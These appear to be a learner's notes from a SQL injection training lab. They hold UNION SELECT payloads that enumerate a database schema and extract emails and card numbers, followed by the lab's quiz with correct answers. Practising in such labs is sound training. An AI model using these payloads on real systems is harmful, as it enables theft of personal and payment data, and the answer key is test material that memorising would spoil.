@@ -1,0 +1,87 @@
+input' UNION SELECT 1,2,group_concat(table_name),4,5 FROM information_schema.tables WHERE table_schema=database()#
+ruby' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()#
+
+Private
+
+
+ruby' UNION SELECT 1,group_concat(column_name, 0x0a),3 FROM information_schema.columns WHERE table_name="customers"#
+1 ID ,Firstname ,Lastname ,Email ,PhoneNumber ,CardNum ,ExpDate 3
+
+ruby' UNION SELECT 1,group_concat(column_name, 0x0a),3 FROM information_schema.columns WHERE table_name="customers"#
+
+ruby 'UNION ALL SELECT Firstname,Lastname,Email FROM customers WHERE Lastname='Ray' #
+mray8@nyu.edu
+
+ruby 'UNION ALL SELECT Firstname,Lastname,CardNum FROM customers WHERE Lastname='Parker' #
+630453017446020596
+
+input' UNION SELECT 1,group_concat(column_name, 0x0a),3,4,5 FROM information_schema.columns WHERE table_name="Private"#
+1 id ,company ,contact ,currency ,balanceowed ,location ,username 3
+
+
+
+
+
+ruby 'UNION ALL SELECT Firstname,Lastname,CardNum,Email FROM customers WHERE Lastname='Walker' #
+input' UNION SELECT 1,company,3 FROM Private WHERE Lastname="Walker" #
+ruby' UNION SELECT ALL 1,company,3 FROM Private WHERE Lastname="Walker" #
+
+
+WORKS
+ruby' UNION ALL SELECT id,company,username FROM Private #
+
+
+ruby 'UNION ALL SELECT ID,Firstname,Lastname FROM customers WHERE Lastname='Walker' #
+ruby 'UNION ALL SELECT id,Firstname,Lastname FROM customers WHERE Firstname='Janet' #
+
+Aibox
+
+
+
+Tasks
+Browse to the target website using the browser in the desktop provided.
+Use SQL injection techniques to enumerate the database schema.
+Use the UNION operator to extract data from the database.
+Question 1 of 9
+Which parameter in the application is vulnerable to SQL injection?
+name
+Your answer to question 1 isCorrect
+Question 2 of 9
+How many columns in the SELECT statement are vulnerable?
+3
+Your answer to question 2 isCorrect
+Question 3 of 9
+Which columns are vulnerable?
+
+---> 1, 2, 3
+
+1, 2, 3, 4, 5
+
+1, 3, 4
+
+2, 4, 6
+Your answer to question 3 isCorrect
+
+Question 4 of 9
+The first table is called ‘customers’. What is the name of the other table?
+Private
+Your answer to question 4 isCorrect
+Question 5 of 9
+How many columns are there in the ‘customers’ table?
+7
+Your answer to question 5 isCorrect
+Question 6 of 9
+What is Martin Ray’s email address?
+mray8@nyu.edu
+Your answer to question 6 isCorrect
+Question 7 of 9
+What is the credit card number belonging to Dennis Parker? Note: do not enter any spaces in the long number.
+630453017446020596
+Your answer to question 7 isCorrect
+Question 8 of 9
+What company does Janet Walker work for?
+Aibox
+Your answer to question 8 isCorrect
+Question 9 of 9
+What is the account balance of Jeremy Ray? Note: do not enter currency value (e.g. £, $).
+5.24
